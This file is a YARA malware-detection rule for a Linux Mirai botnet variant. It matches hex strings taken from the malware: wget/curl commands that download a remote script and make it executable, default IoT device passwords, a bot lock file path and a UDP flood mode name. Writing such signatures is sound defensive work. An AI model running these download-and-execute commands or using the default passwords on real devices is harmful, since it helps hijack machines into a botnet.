
rule Backdoor_Linux_Mirai_B_AMTB{
	meta:
		description = "Backdoor:Linux/Mirai.B!AMTB,SIGNATURE_TYPE_ELFHSTR_EXT,05 00 05 00 06 00 00 "
		
	strings :
		$a_01_0 = {78 6d 68 64 69 70 63 } //1 xmhdipc
		$a_01_1 = {2f 74 6d 70 2f 2e 62 6f 74 5f 6c 6f 63 6b } //1 /tmp/.bot_lock
		$a_01_2 = {63 64 20 2f 72 6f 6f 74 20 77 67 65 74 20 68 74 74 70 3a 2f 2f 25 73 2f 63 61 74 2e 73 68 } //1 cd /root wget http://%s/cat.sh
		$a_01_3 = {77 67 65 74 20 68 74 74 70 3a 2f 2f 25 73 2f 72 75 6e 2e 73 68 3b 20 63 75 72 6c 20 2d 4f 20 68 74 74 70 3a 2f 2f 25 73 2f 72 75 6e 2e 73 68 3b 20 63 68 6d 6f 64 20 37 37 37 20 72 75 6e 2e 73 68 } //1 wget http://%s/run.sh; curl -O http://%s/run.sh; chmod 777 run.sh
		$a_01_4 = {37 75 6a 4d 6b 6f 30 61 64 6d 69 6e } //1 7ujMko0admin
		$a_01_5 = {75 64 70 70 6c 61 69 6e } //1 udpplain
	condition:
		((#a_01_0  & 1)*1+(#a_01_1  & 1)*1+(#a_01_2  & 1)*1+(#a_01_3  & 1)*1+(#a_01_4  & 1)*1+(#a_01_5  & 1)*1) >=5
 
}